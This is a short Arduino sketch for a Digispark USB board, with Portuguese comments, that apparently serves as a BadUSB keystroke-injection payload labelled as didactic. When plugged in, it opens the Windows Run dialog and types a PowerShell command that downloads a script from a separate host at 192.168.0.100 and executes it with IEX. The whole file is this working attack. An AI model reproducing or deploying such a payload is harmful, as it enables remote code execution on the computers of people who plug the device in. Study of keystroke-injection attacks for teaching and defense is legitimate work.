//Este script realiza de forma automatica o download de um arquivo para maquina algo, e pra ser usado na digispark e pode ser melhorado, script para fins didadico

#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  //windows
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  //aguardar 500 milisegundos
  DigiKeyboard.delay(500);
  
  //digitar powershell e dar enter
  DigiKeyboard.println("powershell IEX (New-object Net.WebClient).DownloadString('http://192.168.0.100/teste.txt')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //parar o lop
  for(;;){ }
}
